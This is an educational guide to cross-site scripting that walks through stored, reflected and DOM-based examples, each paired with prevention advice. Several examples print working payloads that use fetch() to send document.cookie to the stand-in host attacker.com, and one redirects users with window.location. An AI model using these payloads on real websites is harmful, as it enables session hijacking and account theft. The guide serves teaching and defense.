# XSS Practical Guide and Reference
**Disclaimer:** This document is intended for educational purposes only. The examples provided are to illustrate potential vulnerabilities and preventive measures related to Cross-Site Scripting (XSS). It is crucial to use this information responsibly and adhere to ethical guidelines. Unauthorized access to systems, networks, or any form of malicious activity is strictly prohibited. The authors and contributors of this document are not responsible for any misuse of the information herein.

## Table of Contents:

1. [Introduction](#introduction)
2. [Levels of Difficulty](#levels-of-difficulty)

   a. [Basic Level](#basic-level-standard-script-injection)

   b. [Intermediate Level](#intermediate-level-obfuscation-techniques)
   
   c. [Advanced Level](#advanced-level-dom-based-xss)
   
   d. [Expert Level](#expert-level-data-interception-and-bypass-techniques)
   
   e. [Creative Level](#creative-level-space-modification-techniques)

3. [Examples](#examples)

---

## Introduction:
Cross-Site Scripting (XSS) is a web security vulnerability that allows attackers to inject malicious scripts into web pages. Understanding and preventing XSS is crucial for secure web development.

## Levels of Difficulty:

| Level            | Attacker's Approach                                  | Developer's Defense                                  |
|------------------|------------------------------------------------------|------------------------------------------------------|
| **Basic Level**  | Injecting a simple script into an input field.        | Basic input validation and output encoding.          |
| **Intermediate Level** | Employing obfuscation techniques.               | Advanced input validation and context-aware encoding. |
| **Advanced Level**     | Manipulating the Document Object Model (DOM).   | Client-side security mechanisms and code reviews.      |
| **Expert Level**       | Intercepting data flows and bypassing controls. | Comprehensive Content Security Policies (CSP).        |
| **Creative Level**     | Modifying spaces within injected code.          | Strict input validation for whitespace characters.  |

## Examples:

### 1. Stored XSS in a Blog Comment Section

**Vulnerability:**
- A blog allows users to submit comments without proper input validation.
- An attacker submits a comment containing the following payload:

    ```html
    <script>
        fetch("https://attacker.com/steal?cookie=" + document.cookie);
    </script>
    ```

**Exploitation:**
- The script steals the user's cookie and sends it to the attacker's domain.

**Prevention:**
- Implement input validation on the server-side to filter and sanitize user comments.
- Encode user-generated content before rendering it on the page.

### 2. Reflected XSS via URL Parameter

**Vulnerability:**
- A search functionality reflects user input directly in the search results.
- An attacker crafts a malicious URL:

    ```
    https://vulnerable-site.com/search?query=<script>alert("XSS");</script>
    ```

**Exploitation:**
- Users clicking on the manipulated link trigger the script, leading to an alert.

**Prevention:**
- Validate and sanitize input parameters on the server.
- Use output encoding when rendering user inputs in HTML.

### 3. DOM-based XSS in a Single Page Application (SPA)

**Vulnerability:**
- An SPA dynamically updates the page based on URL fragments without proper validation.
- An attacker crafts a URL:

    ```
    https://vulnerable-spa.com/#/profile/<img src=x onerror=fetch("https://attacker.com/steal?cookie=" + document.cookie)>
    ```

**Exploitation:**
- The script in the URL is executed, stealing the user's cookie.

**Prevention:**
- Implement proper input validation and sanitization in client-side code.
- Use frameworks that automatically handle input encoding.

### 4. Cookie Theft via Malicious Image Tag

**Vulnerability:**
- An image upload functionality on a social media site does not validate the content type.
- An attacker uploads an image with the following content:

    ```html
    <img src=x onerror=fetch("https://attacker.com/steal?cookie=" + document.cookie)>
    ```

**Exploitation:**
- When users view the attacker's profile, the image tag triggers the script, stealing their cookies.

**Prevention:**
- Validate file types and content on the server when processing uploads.
- Set proper Content Security Policies (CSP) to restrict allowed sources for images.

### 5. Redirecting with `window.location`

**Vulnerability:**
- An input field or URL parameter is not properly validated, allowing an attacker to inject the following payload:

    ```html
    <script>
        window.location = 'https://attacker.com';
    </script>
    ```

**Exploitation:**
- The script redirects the user's browser to the specified malicious site.

**Prevention:**
- Implement strict input validation for input fields and URL parameters.
- Use output encoding to neutralize script tags.


